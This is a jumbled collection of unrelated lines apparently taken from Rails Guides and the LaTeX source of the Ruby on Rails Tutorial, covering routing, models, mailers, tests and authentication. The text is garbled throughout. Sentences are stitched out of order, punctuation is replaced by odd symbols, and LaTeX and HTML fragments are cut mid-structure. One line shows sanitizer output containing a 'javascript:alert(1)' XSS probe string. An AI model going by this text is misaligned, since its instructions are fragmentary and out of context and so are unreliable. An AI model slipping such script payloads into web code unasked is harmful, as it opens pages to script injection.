This is so that the engine routes are confined ╼ to the engine itself and can be mounted at a specific point as shown in the ╼ &#91; test directory &#93; ( # test-directory ) section ▖
CSS for styling error messages .
# config ▖ force _ ssl = true
We can see from Listing ~ \ ref { code : relationships _ controller _ following } why the security issue mentioned above is minor : if an unlogged-in user were to hit either action directly ( e ▖ g ▖ , using a command-line tool like \ kode { curl } ) , \ kode { current \ _ user } would be \ kode { nil } , and in both cases the action &apos;s second line would raise an exception , resulting in an error but no harm to the application or its data .
A \ kode { Gemfile } for the demo app .
{ nil = &gt; nil , 1 = &gt; 1 , nested : { a : 3 , 5 = &gt; 5 } } ▖ deep _ stringify _ keys
Wording
assemblies ▖ create ( attributes = { } )
Even when you &apos;re very careful , things can sometimes go wrong when developing Rails applications .
I got this from the \ href { https : / / help ▖ ubuntu ▖ com / community / ImageMagick } { official Ubuntu documentation } .
This is equivalent to writing :
But you can &apos;t rely on this ▖
The jQuery library provides a large number of methods for manipulating the DOM , but here we will need only two .
Returns a link tag that browsers and feed readers can use to auto-detect an RSS or Atom feed .
The user profile page with code for microposts---but no microposts .
The \ href { http : / / sqlitebrowser ▖ org / } { DB Browser for SQLite } with our new \ kode { users } table .
# # # # Edit the Mailer
create app / mailers / application _ mailer ▖ rb
* his or hers ▖ ▖ ▖ use theirs .
This way , when the validation tests fail we &apos;ll know it &apos;s for the right reason ( and not because the initial object was invalid in the first place ) .
The `inquiry` method converts a string into a `StringInquirer` object making equality checks prettier .
Making the \ kode { name } and \ kode { email } attributes accessible .
= &gt; &#91; 0 , 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 &#93;
In addition to the above special tags , you can supply a final hash of standard HTML options , such as ` : class` , ` : id` or ` : name` :
Recall from the proto-feed in Section ~ \ ref { sec : a _ proto _ feed } that Active Record uses the \ kode { where } method to accomplish the kind of select shown above , as illustrated in Listing ~ \ ref { code : proto _ status _ feed } .
# POST / users
Let &apos;s check the status to see what &apos;s up :
We could make an entirely new module for authentication , but the Sessions controller already comes equipped with a module , namely , \ kode { SessionsHelper } .
encoded _ content = SpecialEncode ( File ▖ read ( &apos; / path / to / filename ▖ jpg &apos; ) )
# # # Gemfile
A mockup of the Home page with a proto-feed .
invoke js
The User model with added password reset attributes .
Whenever you &apos;re confused about something in a Rails application , it &apos;s a good practice to put \ kode { debugger } close to the code you think might be causing the trouble .
g ▖ test _ framework : test _ unit
To run all the tests , do :
: prevent _ delivery _ to _ guests ,
At this point , go ahead and create a micropost or two , taking care to make sure that at least one has a \ kode { user \ _ id } of ~ \ kode { 1 } to match the id of the first user created in Section ~ \ ref { sec : a _ user _ tour } .
# # # # file _ field
as shown in Listing ~ \ ref { code : initial _ micropost _ spec } .
NOTE : _ The same security precautions have to be taken for Ajax actions as for &quot; normal &quot; ones ▖
@ assembly _ count = @ part ▖ assemblies ▖ size
If you have other manifests or individual stylesheets and JavaScript files to ╼ include , you can add them to the `precompile` array in `config / initializers / assets ▖ rb` :
Before moving on with the rest of the introduction , I &apos;d like to take a moment to address the one issue that dogged the Rails framework the most in its early days : the supposed inability of Rails to ``scale &apos; &apos; ---i ▖ e ▖ , to handle large amounts of traffic .
# # # Active Record Observer and Action Controller Sweeper
# # # Write Your Code
That &apos;s the method `get` , `post` , etc ▖ , delegate the work to .
new join models are created for newly associated objects , and if some are gone their rows are deleted .
articles GET / articles ( ▖ : format ) articles # index
# # # Starting up the Web Server
validate : active _ customer , on : : create
We haven &apos;t changed the data model in this chapter , so running the migration at Heroku shouldn &apos;t be necessary , but only if you followed the steps in Section ~ \ ref { sec : modeling _ users _ conclusion } .
In such a case , the resulting redirect would issue a \ kode { GET } request to a URL expecting \ kode { POST } , \ kode { PATCH } , or \ kode { DELETE } , thereby causing an error .
Adding an ( empty ) \ kode { @ feed \ _ items } instance variable to the \ kode { create } action .
The \ kode { update } action needed to get the tests in Listing ~ \ ref { code : successful _ edit _ test } to pass is similar to the final form of the \ kode { create } action ( Listing ~ \ ref { code : login _ upon _ signup } ) , as seen in Listing ~ \ ref { code : user _ update _ action } .
The new user view with partial .
To implement the data model in Figure ~ \ ref { fig : user _ model _ password _ digest } , we first generate an appropriate migration for the \ kode { password \ _ digest } column .
= &gt; 2
# gem &apos; debugger &apos; , group : &#91; : development , : test &#93;
a1 = A ▖ new
Unlike the \ kode { new ▖ html ▖ erb } view , which we created with the generator in Listing ~ \ ref { code : generate _ users _ controller } , the \ kode { show ▖ html ▖ erb } file doesn &apos;t currently exist , so you &apos;ll have to create it by hand , and then fill it with the content shown in Listing ~ \ ref { code : stub _ user _ view } .
Documentation has to be concise but comprehensive ▖
mail ( to : user ▖ email ,
With that , we &apos;re done with the links and named routes , at least until we add a route for logging in ( Chapter ~ \ ref { cha : log _ in _ log _ out } ) .
In this case , the \ kode { div } has a CSS class as well ( \ kode { container } ) .
WARNING ▖ Controllers need to be aware of any redefinition of `to _ param` because when a request like that comes in &quot; 357-john-smith &quot; is the value of `params &#91; : id &#93; ` .
te } ╼ ╼ % subsection destroying _ microposts ( end ) ╼ ╼ \ subsection { Micropost tests } % ( fold ) ╼ \ label { sec : micropost _ tests } ╼ ╼
Article ▖ first ▖ categories ▖ any ?
config ▖ assets ▖ cache _ store = : memory _ store
See ╼ &#91; the MySQL manual &#93; ( http : / / dev ▖ mysql ▖ com / doc / refman / 5 ▖ 6 / en / multiple-column-indexes ▖ html ) ╼ for more details about multiple column indexes .
&lt; h2 &gt; Add a comment : &lt; / h2 &gt;
By default , Rails assumes that primary key columns are named `id` ( and this configuration option doesn &apos;t need to be set ▖ )
* If you are not using Protected Attributes , you can remove any options related to ╼ this gem such as `whitelist _ attributes` or `mass _ assignment _ sanitizer` options .
It is possible to pass variables to Rails partials .
# Use Capistrano for deployment
That may be handy to compute method names in a language that follows that convention , for example JavaScript .
A user has many microposts .
The completed Sessions controller \ kode { create } action ( not yet working ) .
# # # `config / secrets ▖ yml`
resources : articles do
Following the model from Section ~ \ ref { sec : signup _ form } for the signup page , our plan is to create a login form for creating new sessions , as mocked up in Figure ~ \ ref { fig : login _ mockup } .
# # # Anonymous
Finally , although we won &apos;t use it in this tutorial , we &apos;ll record the time and date of the activation in case we want it for future reference .
Associations use this method to infer foreign keys , for example `has _ one` and `has _ many` do this :
Locations for Initialization Code
# = &gt; Fri , 06 Aug 2010 17 : 11 : 58 CEST + 02 : 00
Active Job provides a Rails generator to create jobs ▖
By the way , the extra level of indentation on \ kode { create \ _ remember \ _ token } is there to make it visually apparent which methods are defined after \ kode { private } .
Rails can validate a variety of conditions in a model , ╼ including the presence or uniqueness of columns , their format , and the ╼ existence of associated objects ▖
&#91; &quot; 1 &quot; , &quot; 2 &quot; , &quot; 3 &quot; &#93;
return if self &#91; &quot; Cache-Control &quot; &#93; ▖ present ?
If there is no such controller-specific layout , Rails will use `app / views / layouts / application ▖ html ▖ erb` or `app / views / layouts / application ▖ builder` ▖
A GitHub repository page ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / github _ repository _ page _ 4 _ 0-full ▖ png } { ( full size ) }
Verify that the code in Listing ~ \ ref { code : gravatar _ option } allows the \ kode { gravatar \ _ for } helper defined in Section ~ \ ref { sec : a _ gravatar _ image } to take an optional \ kode { size } parameter , allowing code like \ kode { gravatar \ _ for user , size : 50 } in the view .
To activate the root route , uncomment this line by removing the hash character and then replace it with the code in Listing ~ \ ref { code : hello _ root _ route } , which tells Rails to send the root route to the \ kode { hello } action in the Application controller .
&lt; td &gt; &lt; % = book ▖ content % &gt; &lt; / td &gt;
If your comment simply says &quot; + 1 &quot; , then odds are that other reviewers aren &apos;t going to take it too seriously ▖
# # # Saving data in the controller
as shown in Listing ~ \ ref { code : test _ helper _ sign _ in } .
person ▖ errors ▖ messages # = &gt; { }
Loofah in turn uses Nokogiri , which ╼ wraps XML parsers written in both C and Java , so sanitization should be faster ╼ no matter which Ruby version you run .
For example , to test a signup page manually , we would have to visit the page in a browser and then submit alternately invalid and valid data , verifying in each case that the application &apos;s behavior was correct .
Finally , the assets for this resource are generated in two files :
The profile of a user to follow , with a follow button ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / page _ flow _ other _ profile _ follow _ button _ mockup _ bootstrap-full ▖ png } { ( full size ) }
postgresql : / / localhost / my _ database
= &gt; nil
If you don &apos;t want to force a layout on to users of the engine , then you can ╼ delete this file and reference a different layout in the controllers of your ╼ engine .
as seen in Listing ~ \ ref { code : password _ migration } .
SELECT * FROM articles WHERE `trashed` = 0
Action View
class _ name : &quot; Order &quot;
* Rails 4 ▖ 0 deprecated `ActionController : : PerformanceTest` in favor of `ActionDispatch : : PerformanceTest` .
The `new` action is now creating a new instance variable called ` @ article` , and ╼ you &apos;ll see why that is in just a few moments .
Adding CarrierWave to the \ kode { Gemfile } .
With this change , creating a new order for a particular customer is easier :
nick ▖ save
the ╼ &#91; * Ruby on Rails Tutorial * &#93; ( http : / / railstutorial ▖ jp / )
Here the \ kode { page } parameter comes from \ kode { params &#91; : page &#93; } , which is generated automatically by \ kode { will \ _ paginate } .
* `config ▖ assets ▖ version` is an option string that is used in MD5 hash generation ▖
\ label { table : url _ mapping } } ╼ \ end { table } ╼ ╼ \ subsection { Contact page } % ( fold ) ╼ \ label { sec : contact _ page } ╼ ╼
We will add an important new test , though , writing our first \ emph { integration test } to check that the links on the final layout are correct ( Section ~ \ ref { sec : layout _ link _ tests } ) .
Rails will execute this migration command and tell you it created the Articles ╼ table .
x = x + 1
You can verify at this point that the test suite is failing :
_ Remember to escape these header fields , too .
Note that we &apos;ve included a flag to skip generating tests .
We &apos;ll see in Section ~ \ ref { sec : demo _ user _ has _ many _ microposts } ( and more fully in Chapter ~ \ ref { cha : user _ microposts } ) how this \ kode { user \ _ id } attribute allows us to succinctly express the notion that a user potentially has many associated microposts .
{ code : palindrome _ if } ? How does it change if you reassign the variable ~ \ kode { s } to the string `` \ href { http : / / www ▖ dictionary ▖ com / browse / onomatopoeia } { onomatopoeia } &apos; &apos; ? \ emph { Hint } : Use up-arrow to retrieve and edit previous commands ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-519870 &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ \ begin { codelisting } ╼ \ label { code : palindrome _ if } ╼ \ codecaption { A simple palindrome test ▖ } ╼ % = lang : irb ╼ \ begin { code } ╼ &gt; &gt; puts &quot; It &apos;s a palindrome ! &quot; if s = = s ▖ reverse ╼ \ end { code } ╼ \ end { codelisting } ╼ ╼ \ subsection { Method definitions } % ( fold ) ╼ \ label { sec : method _ definitions } ╼ ╼
Note that \ kode { paginate } takes a hash argument with key \ kode { : page } and value equal to the page requested .
in Listing ~ \ ref { code : test _ helper _ sign _ in } .
It offers a richer bottom-line at the language level , targeted both at the development of Rails applications , and at the development of Ruby on Rails itself .
You can then refer to those containers easily by following the convention , instead of having to think about which class or id attribute you should use .
Normally this is a feature , since it lets you continue to use the command line after launching your editor , but Git interprets the detachment as closing the file with an empty commit message , which prevents the commit from going through .
You should substitute \ kode { &apos; 1 ▖ 9 ▖ 3 &apos; } if that &apos;s the version of Ruby you &apos;re using , though for this tutorial the difference shouldn &apos;t ever matter ▖ )
To implement the forwarding itself , we use the \ kode { redirect \ _ back \ _ or } \ linebreak method to redirect to the requested URL if it exists , or some default URL otherwise , which we add to the Sessions controller \ kode { create } action to redirect after successful login ( Listing ~ \ ref { code : friendly _ session _ create } ) .
▖ field _ with _ errors {
That code will pull in the partial from `app / views / shared / _ menu ▖ html ▖ erb` .
So this would be wrong :
The third argument , `indent _ empty _ lines` , is a flag that says whether empty lines should be indented ▖
Different contributors will sometimes have different opinions , and often ╼ patches will need revised before they can get merged .
As a result , we &apos;ll spend most of our time in our text editor and browser , using TDD only to add a Contact page ( Section ~ \ ref { sec : contact _ page } ) .
* `reorder`
Finding the current user using the \ kode { remember \ _ token } .
As the previous example shows , Active Support knows some irregular plurals and uncountable nouns ▖
There &apos;s also &#91; Spree &#93; ( https : / / github ▖ com / spree / spree ) which ╼ provides an e-commerce platform , and ╼ &#91; RefineryCMS &#93; ( https : / / github ▖ com / refinery / refinerycms ) , a CMS engine .
at least one letter , digit , hyphen , or dot
def set _ business _ headers
To use bcrypt in the sample application , we need to add the \ kode { bcrypt } gem to our \ kode { Gemfile } ( Listing ~ \ ref { code : bcrypt _ ruby } ) .
module Y
You can pass in a numerical argument to the `take` method to return up to that number of results ▖
By convention , Rails assumes that the column in the join table used to hold the foreign key pointing to the other model is the name of that model with the suffix ` _ id` added ▖
In particular , the signin failure tests are currently passing :
require &quot; pry &quot;
NOTE : All the following methods are defined in `active _ support / core _ ext / date _ time / calculations ▖ rb` .
invoice ▖ lines ▖ to _ formatted _ s ( : db ) # = &gt; &quot; 23,567,556,12 &quot;
Check the &#91; sass-rails documentation &#93; ( https : / / github ▖ com / rails / sass-rails # features ) for more info and important caveats .
Fixing this blemish requires a significantly more complicated regular expression and is left as an exercise ( Section ~ \ ref { sec : modeling _ users _ exercises } ) ▖ )
&quot; digest &quot; : &quot; 231a680f23887d9dd70710ea5efd3c62 &quot; } } , &quot; assets &quot; : { &quot; application ▖ js &quot; :
* `assets` allows to create assets on generating a scaffold ▖
&lt; % if @ article ▖ errors ▖ any ?
Arguments may be bare constant names :
for severity in Severity ▖ constants
By the way , if you &apos;re comfortable with exceptions in Ruby , you could also write the \ kode { correct \ _ user } filter like this :
has _ many : appointments
This is a long and action-packed chapter , and you may find it unusually challenging , especially if you are new to data modeling .
The way to change the links in the site layout involves using an ╼ if-else branching structure inside of Embedded Ruby :
By modifying the user information and clicking the Update User button , we arrange to change the information for the user in the toy application ( Figure ~ \ ref { fig : demo _ update _ user _ rails _ 3 } ) .
* Validate models before they get persisted to the database .
# = &gt; &quot; &lt; p &gt; &lt; a href = &quot; javascript : alert ( 1 ) &quot; &gt; hello &lt; / a &gt; &lt; / p &gt; &quot;
Note the added \ kode { require } .
&quot; foo &quot; ▖ indent ( 2 ) # = &gt; &quot; foo &quot;
To create the new model , ╼ run this command in your terminal :
# do something with the job instance
We can see the result of the before filter in Listing ~ \ ref { code : authorize _ before _ filter } by logging out and attempting to access the user edit page \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / 1 / edit } { / users / 1 / edit } , as seen in Figure ~ \ ref { fig : protected _ log _ in } .
Rails would match `photos / 12` to the `show` action of `PhotosController` , and set `params &#91; : format &#93; ` to ` &quot; jpg &quot; ` .
* serving static assets :
as shown in Listing ~ \ ref { code : password _ reset _ mailer _ test } .
as shown in Listing ~ \ ref { code : development _ debugger } .
# # # # # ` : touch`
clients = Client ▖ limit ( 10 )
Once users can sign up , we &apos;ll let them log in and log out as well ( Chapter ~ \ ref { cha : log _ in _ log _ out } ) , and in Chapter ~ \ ref { cha : updating _ showing _ and _ deleting _ users } ( Section ~ \ ref { sec : requiring _ logged _ in _ users } ) we &apos;ll learn how to protect pages from improper access .
* Pass the file name and content and Action Mailer and the ╼ &#91; Mail gem &#93; ( https : / / github ▖ com / mikel / mail ) will automatically guess the ╼ mime _ type , set the encoding and create the attachment .
in Listing ~ \ ref { code : signin _ features } .
Tests for the ( proto- ) status feed .
def article _ params
url : postgresql : / / localhost / blog _ development ?
* Rails 4 ▖ 0 deprecated `ActionController : : AbstractResponse` in favor of `ActionDispatch : : Response` .
The \ kode { logged \ _ in ? } \
We can see what happens without a save by using \ kode { reload } , which reloads the object based on the database information :
Unix processes
Because Ruby uses CamelCase for class names ( Section ~ \ ref { sec : ruby _ classes } ) , my preference is to refer to controllers using their CamelCase names , but this is a matter of taste .
* `initialize _ cache` If `Rails ▖ cache` isn &apos;t set yet , initializes the cache by referencing the value in `config ▖ cache _ store` and stores the outcome as `Rails ▖ cache` ▖
The first refactoring attempt at the index view .
&lt; small &gt;
* ` : arguments` - The command line arguments ▖
In the context of the current user , this suggests the following construction :
We could do this by hand with a browser , first visiting the root path and then checking the links by hand , but this quickly becomes cumbersome .
render html : &quot; &lt; strong &gt; Not Found &lt; / strong &gt; &quot; ▖ html _ safe
create _ table : publications do &#124; t &#124;
xml ▖ description &quot; Basecamp : Recent items &quot;
They do not have far-future headers by default , so to get the benefit of ╼ fingerprinting you &apos;ll have to update your server configuration to add those ╼ headers .
set _ callback : save , : around , - &gt; ( r , block ) { stuff ; result = block ▖ call ; stuff }
The \ kode { followed } association isn &apos;t actually needed until Section ~ \ ref { sec : followers } , but the parallel follower / followed structure is clearer if we implement them both at the same time .
Nested routes allow you to capture this relationship in your routing ▖
The `has _ many : through` association is also useful for setting up &quot; shortcuts &quot; through nested `has _ many` associations ▖
If an exception is raised during the execution of the block and is `kind _ of ? ` any of the arguments , `suppress` captures it and returns silently ▖
Currently , there is no way for users to find each other , apart from paging through the user index or viewing the feeds of other users .
# Generates a select field for five years on either side of Date ▖ today that defaults to the current year
In order to test the form submission , we need to issue a \ texttt { POST } request to the \ kode { users \ _ path } ( Table ~ \ ref { table : table-RESTful _ users } ) , which we can do with the \ kode { post } function :
Let &apos;s also make a text part for this email ▖
Filling in the comments with code leads to the \ kode { log \ _ in \ _ as } helper method shown in Listing ~ \ ref { code : test _ helper _ log _ in } .
Listing ~ \ ref { code : valid _ user _ test } uses the plain \ kode { assert } method , which in this case succeeds if \ kode { @ user ▖ valid ? } \ returns \ kode { true } and fails if it returns \ kode { false } .
% w ( Earth Wind ) ▖ to _ sentence # = &gt; &quot; Earth and Wind &quot;
custom _ helpers ( end ) ╼ ╼ % section motivation ( end ) ╼ ╼ \ section { Strings and methods } % ( fold ) ╼ \ label { sec : strings _ and _ methods } ╼ ╼
The \ kode { rails new } command ( Listing ~ \ ref { code : rails _ new _ sample _ app } ) creates a layout file by default , but it &apos;s instructive to ignore it initially , which we can do by changing its name :
If you set the ` : dependent` option to :
The \ kode { second } method used here isn &apos;t currently part of Ruby itself , but rather is added by Rails .
If an update request is made with a lower value in the `lock _ version` field than is currently in the `lock _ version` column in the database , the update request will fail with an `ActiveRecord : : StaleObjectError` ▖
Binary executable files
Rails is used by companies as diverse as \ href { http : / / airbnb ▖ com / } { Airbnb } , \ href { http : / / basecamp ▖ com / } { Basecamp } , \ href { http : / / disney ▖ com / } { Disney } , \ href { http : / / github ▖ com / } { GitHub } , \ href { http : / / hulu ▖ com / } { Hulu } , \ href { http : / / kickstarter ▖ com / } { Kickstarter } , \ href { http : / / shopify ▖ com / } { Shopify } , \ href { http : / / twitter ▖ com / } { Twitter } , and the \ href { http : / / yellowpages ▖ com / } { Yellow Pages } .
Action Dispatcher Middleware Stack
generates something like this :
This is where we want the comment to show , so let &apos;s ╼ add that to the `app / views / articles / show ▖ html ▖ erb` .
/ / = require jquery
# # # # # `association ( force _ reload = false ) `
Validations are typically run before these commands are sent to the ╼ database ▖
A relation which has used `unscope` will affect any relation it is ╼ merged in to :
However , associations ╼ that contain the following options will not have their inverses set ╼ automatically :
Note the use of strong parameters via \ kode { micropost \ _ params } , which permits only the micropost content to be edited through the web .
The method `assert _ valid _ keys` receives an arbitrary number of arguments , and checks whether the receiver has any key outside that white list ▖
)
Another common ╼ symptom is characters like &quot; Ã ¼ &quot; appearing instead of &quot; ü &quot; ▖
# # # Remove : cache and : concat options in asset helpers references in views
We &apos;ll continue this theme by using a \ kode { destroy } action to delete sessions , i ▖ e ▖ , to sign out .
# Generates class methods to access @ @ emulate _ booleans with default value of true .
root GET / welcome # index
The list of emails can be an array of email addresses or a single string ╼ with the addresses separated by commas .
mail ▖ perform _ deliveries = false
in Listing ~ \ ref { code : before _ create _ activation _ digest } .
`Rails ▖ application` is the primary Rack application object of a Rails ╼ application ▖
# # # # Rendering an Action &apos;s Template from Another Controller
git @ heroku ▖ com : stormy-cloud-5881 ▖ herokuapp ▖ com
Each action needs to set a title , find the user , retrieve either \ kode { @ user ▖ following } or \ kode { @ user ▖ followers } ( in paginated form ) , and then render the page .
&lt; / footer &gt;
Next , we &apos;ll create an instance variable containing the user ( for use in the view ) , and then mail the result to \ kode { user ▖ email } ( Listing ~ \ ref { code : mail _ account _ activation } ) .
Since `dup` does not make deep copy , the string inside the array is still the same object .
The CSS for microposts ( including all the CSS for this chapter ) .
The problem is that we want the microposts to exist immediately , so that the timestamps are in the right order and so that \ kode { @ user ▖ microposts } isn &apos;t empty ▖ We accomplish this with \ kode { let ! } , which forces the corresponding variable to come into existence immediately .
Experienced Rails developers might have expected the use of \ kode { content \ _ for } at this point , but it doesn &apos;t work well with the asset pipeline .
In addition to focusing on general principles of web development ( rather than on Rails specifically ) , the \ rort \ teaches the broader skill of \ emph { technical sophistication } ( Box ~ \ ref { aside : technical _ sophistication } ) , \ footnote { \ xkcduse ▖ } which is a principal theme developed by the \ letbd \ tutorials ▖ \ footnote { learnenough ▖ com / story } In particular , the Learn Enough introductory sequence consists of a series of tutorials that are suitable as prerequisites to the \ rort , starting with \ lecl , \ footnote { learnenough ▖ com / command-line } which ( unlike the present tutorial ) is aimed at complete beginners ▖ ╼ ╼ ╼ \ begin { aside } ╼ \ label { aside : technical _ sophistication } ╼ \ heading { Technical sophistication } ╼ ╼ The \ rort \ is part of the \ letbd \ family of tutorials , which develop the theme of \ emph { technical sophistication } : the combination of hard and soft skills that make it seem like you can magically solve any technical problem ( Figure ~ \ ref { fig : tech _ support _ cheat _ sheet } ) ▖ Web development , and computer programming in general , are essential components of technical sophistication , but there &apos;s more to it than that---you also have to know how to click around menu items to learn the capabilities of a particular application , how to clarify a confusing
# # # Controlling Caching
http _ basic _ authenticate _ with name : &quot; dhh &quot; , password : &quot; secret &quot; , except : &#91; : index , : show &#93;
A user profile with a follow button ( \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / 2 } { / users / 2 } ) .
Its purpose is just to give you a taste of Cucumber ( crisp and juicy , no doubt ) ---if it strikes your fancy , there are entire books on the subject waiting to satisfy your appetite .
The bottom portion ╼ provides a form to create a new user .
&#124; &#124; 207 &#124; : multi _ status &#124;
Restart your server .
# &lt; / objects &gt;
There &apos;s an additional detail we need to address regarding our application &apos;s data model : unlike symmetric Facebook-style friendships , which are always reciprocal ( at least at the data-model level ) , Twitter-style following relationships are potentially \ emph { asymmetric } ---Calvin can follow Hobbes without Hobbes following Calvin .
The difference between them is the \ href { http : / / en ▖ wikipedia ▖ org / wiki / HTTP _ request # Request _ methods } { HTTP request method } they respond to .
&#91; 2 , 4 , 6 , 8 , 10 &#93; ▖ sum # = &gt; 30
Get help on the Ruby on Rails Tutorial at the
Common validations include presence , length , and format .
Routes inside an engine are isolated from the application by default ▖
# # # Listing Existing Routes
Assuming that the ` @ customer` instance variable contains an instance of the `Customer` model , this will use ` _ customer ▖ html ▖ erb` to render it and will pass the local variable `customer` into the partial which will refer to the ` @ customer` instance variable in the parent view .
Note that we &apos;ve added a second test , which checks that the current user is \ kode { nil } if the user &apos;s remember digest doesn &apos;t correspond correctly to the remember token , thereby testing the \ kode { authenticated ? } \ expression in the nested \ kode { if } statement :
http : / / rails-tutorial-c9-mhartl ▖ c9 ▖ io / account _ activations / ╼ fFb _ F94mgQtmlSvRFGsITw / edit ?
suppress ( ActiveRecord : : StaleObjectError ) do
Since there are two ways to set your connection , via environment variable it is important to understand how the two can interact .
Active Record allows us to impose such constraints using \ emph { validations } .
to escape the test user &apos;s email
Then use the \ kode { heroku } command to log in at the command line ( you may have to exit and restart your terminal program first ) :
If not found , ╼ then it will attempt to load a template called `application / new` ▖
&quot; DateTime &quot; = &gt; &quot; datetime &quot; ,
Any accidental exposure of the edit methods to unauthorized users will now be caught immediately by our test suite .
# # # # Adding Collection Routes
It &apos;s not just you ; every developer goes through it ( often more than once ) , but rest assured that the effort will be richly rewarded .
Active Record is the M in &#91; MVC &#93; ( getting _ started ▖ html # the-mvc-architecture ) - the ╼ model - which is the layer of the system responsible for representing business ╼ data and logic ▖
This will render the template &apos; another _ template ▖ html ▖ erb &apos; for the HTML part and ╼ use the rendered text for the text part ▖
Instead , we need to redirect to a different page , and it makes sense for that page to be the newly created user &apos;s profile .
It defaults to &quot; 1 &quot; and can be easily changed .
# # # Learning Rack
Code for the About page ▖
MyJob ▖ set ( queue : : another _ queue ) ▖ perform _ later ( record )
Recalling that the signup page / signup is routed to the \ kode { new } action in the Users controller ( Listing ~ \ ref { code : signup _ route } ) , our first step is to create the User object required as an argument to \ kode { form \ _ for } .
The Home page at the root route .
The simplified user \ kode { index } action for the toy application .
The default error message is _ &quot; is reserved &quot; _ .
My favorite way to handle this kind of situation is to raise an exception in the suspected untested block of code : if the code isn &apos;t covered , the tests will still pass ; if it is covered , the resulting error will identify the relevant test ▖ The result in the present case appears in Listing ~ \ ref { code : branch _ raise } .
Once you have a lot of experience modeling a particular domain , you can often guess such utility methods in advance , and even when you can &apos;t you &apos;ll often find yourself writing them to make the tests cleaner .
It &apos;s worth noting that our test suite covers most of the authentication machinery , but not all of it .
# # # Running Tests
The expression above does have one weakness , though : it allows invalid addresses such as \ kode { foo @ bar ▖ ▖ com } that contain consecutive dots .
You can also do that with `render` , which accepts the full path ( relative to `app / views` ) of the template to render ▖
performs the count directly in the database ▖ )
A test for the rejection of duplicate email addresses , insensitive to case .
&#124; key &#124; key _ len &#124; ref &#124; rows &#124; Extra &#124;
The same remarks about ordering made above apply ▖
2 ) # = &gt; false
You can disable the asset pipeline while creating a new application by ╼ passing the `--skip-sprockets` option .
Array ▖ wrap ( foo : : bar ) # = &gt; &#91; { : foo = &gt; : bar } &#93;
The improved \ kode { README } file formatted with Markdown .
A test for the email downcasing from Listing ~ \ ref { code : email _ downcase } .
The CoffeeScript in rails ▖ js then listens for these ╼ attributes , and attaches appropriate handlers .
The inverse of \ kode { create } is \ kode { destroy } :
We can add the feed to the Home page by rendering the feed partial as usual ( Listing ~ \ ref { code : home _ with _ feed } ) .
This will allow us to design the look and feel of the web pages first , deferring the back-end functionality until later in this section .
The error occurred while evaluating nil ▖ empty ?
Returns an input tag of the &quot; url &quot; type tailored for accessing a specified attribute .
Experienced Rails developers might have expected the use of \ kode { content \ _ for } at this point , but it doesn &apos;t work well with the asset pipeline .
╼ $ cd ~ / rails _ projects / sample _ app
`config ▖ action _ mailer ▖ perform _ deliveries` specifies whether mail will actually be delivered and is true by default
As noted in Section ~ \ ref { sec : the _ form _ html } , this HTML issues a \ texttt { POST } request to the / users URL .
In test-driven development , we first write a \ emph { failing } test , represented in many testing tools by the color red .
When you declare a `has _ and _ belongs _ to _ many` association , the declaring class automatically gains 16 methods related to the association :
A \ kode { Gemfile } for the sample app , including Guard .
Adding account activation to user signup ▖
We come finally to the micropost list itself :
We can undo a single migration step using
This time we point the form to the `update` action , which is not defined yet ╼ but will be very soon .
If , in the case of this `includes` query , there were no comments for any ╼ articles , all the articles would still be loaded ▖
Be aware that some resources , while still excellent , cover versions of Ruby as old as ╼ 1 ▖ 6 , and commonly 1 ▖ 8 , and will not include some syntax that you will see in day-to-day ╼ development with Rails .
&quot; / Users / ryan / Sites / side _ projects / blorgh / app / views &quot;
Active Support
Use `assets : precompile` instead .
We &apos;ll end by taking a first important step toward letting users sign up to our site ( Section ~ \ ref { sec : user _ signup } ) .
The params object created when this form is submitted would look like :
To display the messages in the browser , we &apos;ll render an error-messages partial on the user \ kode { new } page while adding the CSS class \ kode { form-control } ( which has special meaning to Bootstrap ) to each entry field , as shown in Listing ~ \ ref { code : f _ error _ messages } .
# # # HTTP PATCH
@ customer ▖ orders &lt; &lt; @ order1
# &lt; rank type = &quot; integer &quot; &gt; 1 &lt; / rank &gt;
The method `Range # overlaps ? ` says whether any two given ranges have non-void intersection :
When interacting with a Rails application , a browser sends a \ emph { request } , which is received by a web server and passed on to a Rails \ emph { controller } , which is in charge of what to do next .
Then run \ kode { bundle install } :
As suggested in Section ~ \ ref { sec : sass } , go through the steps to convert the footer CSS from Listing ~ \ ref { code : footer _ css } to Listing ~ \ ref { code : refactored _ scss } to SCSS by hand .
Testing that the \ kode { admin } attribute is forbidden .
config ▖ assets ▖ js _ compressor = : uglifier
Requiring a logged-in user for the \ kode { index } action ▖
Adding the Faker gem to the \ kode { Gemfile } .
in Listing ~ \ ref { code : edit _ update _ redirect _ tests } .
For bigger sites , you would probably need to generate the feed asynchronously using a background job , but such scaling subtleties are beyond the scope of this tutorial ▖ )
Because we used the \ kode { image \ _ tag } helper in Listing ~ \ ref { code : signup _ button } , Rails will automatically find any images in the \ kode { app / assets / images / } directory using the asset pipeline ( Section ~ \ ref { sec : sass _ and _ the _ asset _ pipeline } ) .
The appearance of a ``Sign out &apos; &apos; link
More detailed description , if necessary ▖
Although the two are equivalent , using \ kode { assert \ _ no \ _ difference } is cleaner and is more idiomatically correct Ruby .
Since the Rails asset pipeline automatically uses Sass to process files with the \ kode { ▖ scss } extension , the \ kode { custom ▖ css ▖ scss } file will be run through the Sass preprocessor before being packaged up for delivery to the browser .
in Listing ~ \ ref { code : user _ info } ╼ and
Unfortunately , the reverse doesn &apos;t work : by default , the set of all followed users would be called the \ emph { followeds } , which is ungrammatical and clumsy .
It &apos;s also important to understand that the name of the function argument is irrelevant as far as the caller is concerned .
( It &apos;s important to understand that , when developing Rails applications on a local computer , the client and server are the same physical machine , but in general they are different ▖ )
Notice here that we \ kode { render } a partial called \ kode { &apos; shared / error \ _ messages &apos; } ; this reflects the common Rails convention of using a dedicated \ kode { shared / } directory for partials expected to be used in views across multiple controllers .
When writing a Ruby on Rails tutorial , it is tempting to rely on the scaffolding approach---it &apos;s \ href { http : / / en ▖ wikipedia ▖ org / wiki / Dark _ side _ ( Star _ Wars ) } { quicker , easier , more seductive } .
As we saw in Section ~ \ ref { sec : resetting _ the _ password } ( Listing ~ \ ref { code : password _ reset _ form } ) , the hidden \ kode { input } tag puts the relevant information on the page without displaying it in the browser .
Finding the current user in the session .
